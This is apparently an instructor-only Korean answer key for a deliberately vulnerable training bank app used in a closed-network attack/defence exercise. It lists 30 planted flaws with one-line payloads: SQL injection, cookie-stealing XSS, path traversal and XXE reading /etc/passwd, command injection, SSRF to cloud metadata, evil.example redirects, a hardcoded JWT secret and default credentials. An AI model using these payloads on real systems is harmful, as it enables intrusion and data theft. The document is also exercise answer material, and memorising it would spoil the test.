# NeoBank — 30 취약점 카탈로그 (Normal 모드)

> ⚠️ 강사·평가자 전용. 학생에게 직접 공유 금지. CCC 폐쇄망 학습용.

## 매핑

| # | 코드 | OWASP | 카테고리 | 위치 (endpoint / file) | 핵심 PoC |
|---|------|-------|----------|------------------------|----------|
| 1 | V01 | A01 BAC | IDOR — 다른 유저 계좌 조회 | `GET /accounts/<id>` | `/accounts/1` (admin slush 잔액 1억 노출) |
| 2 | V02 | A01 BAC | IDOR — 다른 사람 거래 취소 | `POST /transfer/<tid>/cancel` | `curl -X POST /transfer/1/cancel` (소유 검증 없음) |
| 3 | V03 | A03 Injection | SQLi — login form | `POST /login` | `email=' OR 1=1--&password=x` |
| 4 | V03b | A03 Injection | SQLi — 거래 검색 | `GET /search?q=` | `q=' UNION SELECT 1,email,password,4,5 FROM users--` |
| 5 | V03c | A03 Injection | SQLi — `/api/users/check?email=` | API | `email=' OR 1=1--` |
| 6 | V04 | A02 Crypto | JWT 만료 없음 (영구 토큰) | `/api/login` 발급 | jwt.io 디코드 → exp 필드 부재 |
| 7 | V05 | A02 Crypto | JWT 약한 secret | server-side hardcoded | `neobank-supersecret-2024` brute-force or 코드 grep |
| 8 | V06 | A02 Crypto | JWT 'none' alg 허용 | `current_user()` 검증 우회 | `Authorization: Bearer eyJ.alg=none.` |
| 9 | V07 | A07 AuthFail | 인증 우회 (X-Internal: 1) | `GET /api/admin/users` | header `X-Internal: 1` |
| 10 | V08 | A01 BAC | 권한 상승 (X-Role: admin) | `current_user()` | header `X-Role: admin` |
| 11 | V09 | A08 Integrity | CSRF — 송금 폼 토큰 부재 | `POST /transfer` | 외부 사이트 form auto-submit |
| 12 | V10 | A03 Injection | Stored XSS — 거래 메모 | `POST /transfer` memo | memo=`<script>alert(document.cookie)</script>` → /accounts/<id> 에서 발현 |
| 13 | V11 | A03 Injection | Reflected XSS — 검색 | `GET /search?q=<script>` | URL 클릭 유도 |
| 14 | V12 | A05 Misconfig | Path Traversal — 명세서 | `GET /statements?file=` | `file=../../../../etc/passwd` |
| 15 | V13 | A05 Misconfig | Open Redirect — 로그아웃 | `GET /logout?next=` | `?next=https://evil.example` |
| 16 | V14 | A10 SSRF | SSRF — 신용 조회 | `GET /loan/check?url=` | `url=http://169.254.169.254/latest/meta-data` (AWS 메타데이터) |
| 17 | V15 | A07 AuthFail | 예측 가능 reset 토큰 | `POST /password/reset` | md5(time + uid) → 1초 단위 brute |
| 18 | V16 | A07 AuthFail | 계정 enumeration | `POST /login` 에러 메시지 | "Wrong password for X" vs "No such email" |
| 19 | V17 | A07 AuthFail | Brute force — rate limit 없음 | `/login`, `/api/login` | hydra |
| 20 | V18 | A07 AuthFail | 약한 비밀번호 정책 | seed 사용자 `qwerty`/`teller1` | rockyou.txt top 100 |
| 21 | V19 | A02 Crypto/PII | PII 노출 — admin API | `GET /api/admin/users` | ssn/phone/secret_answer/api_key 모두 평문 |
| 22 | V20 | A01 BAC | Mass assignment — 프로필 수정 | `POST /api/profile/update` | `{"role":"admin","api_key":"X"}` 본인 권한 상승 |
| 23 | V21 | A08 Integrity | Pickle deserialization → RCE | `POST /api/session/restore` | base64-encoded malicious pickle |
| 24 | V22 | A05 Misconfig | XXE — 거래 batch import | `POST /api/transfers/import` | `<!DOCTYPE [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` |
| 25 | V23 | A03 Injection | Command Injection — 영수증 | `GET /api/receipts/render?name=` | `name=x;cat /etc/passwd > /tmp/p` |
| 26 | V24 | A05 Misconfig | LFI — 템플릿 | `GET /render?template=` | `template=../../etc/passwd` |
| 27 | V25 | A05 Misconfig | CORS misconfiguration | 모든 응답 헤더 | `Origin: evil.com` 그대로 허용 |
| 28 | V26 | A09 Logging/Disclosure | Verbose error | `POST /login` SQL 실패 시 stack | SQL 에러로 스키마 leak |
| 29 | V27 | A07 AuthFail | Default credentials | `admin@neobank.local / admin` | seed 그대로 |
| 30 | V28 | A06 Vuln Components | Outdated dependency banner | `GET /version` | Flask 1.0.2 / requests 2.6.0 / Pillow 8.0.0 (모두 known CVE) |

추가 (chain depth 3):
- V29 Time-based blind SQLi (`/api/users/check`) — sqlmap `--time-sec`
- V30 Second-order SQLi — `POST /api/profile/update` 에 `secret_answer=' OR 1=1--` 저장 → `/api/profile/recover` 에서 발화

## 권장 공방 시나리오 (Battle 기준)

| 단계 | 공격 (RED) | 방어 (BLUE) |
|------|-----------|-------------|
| 정찰 | `/version` · `/health` · 디렉토리 brute | error msg 정규화 + 디렉토리 listing 차단 |
| 인증 우회 | V03/V05/V08 SQLi or X-Role | parameterized query + JWT alg whitelist |
| 권한 상승 | V20 mass assignment | role 화이트리스트 + 입력 검증 |
| 데이터 탈취 | V19 PII / V01 IDOR | RBAC + 응답 필드 마스킹 |
| 영구화 | V21 pickle RCE / V23 cmd inject | shell=True 제거 + safe deserializer |
| 흔적 삭제 | V13 open redirect via reset / V02 transfer cancel | audit log immutable + 소유 검증 |

## 점수 가중 (자율 공방전 자동 채점 권장)

| 난이도 | claim 점수 | 사례 |
|--------|-----------|------|
| Trivial (1~3) | +5 | V27 default cred login, V28 banner |
| Easy (4~10) | +10 | V03/V11/V13/V14 (단일 페이로드) |
| Medium (11~20) | +20 | V01/V09/V15/V19/V25 |
| Hard (21~28) | +30 | V21 pickle RCE, V22 XXE, V23 cmd inject, V20 mass assign |
| Chain (V29/V30) | +40 | second-order, blind SQLi |

## 운영자 점검

- DB 초기화: `python app.py` 첫 실행 시 자동 (`neobank.db` 없으면)
- 시드 사용자 5명: admin / alice / bob / carol / teller1
- 시드 계좌 5개 (admin slush 1억 KRW 포함)
- 의도된 race condition: 0.4초 sleep — 동시 송금으로 음수 잔액 가능
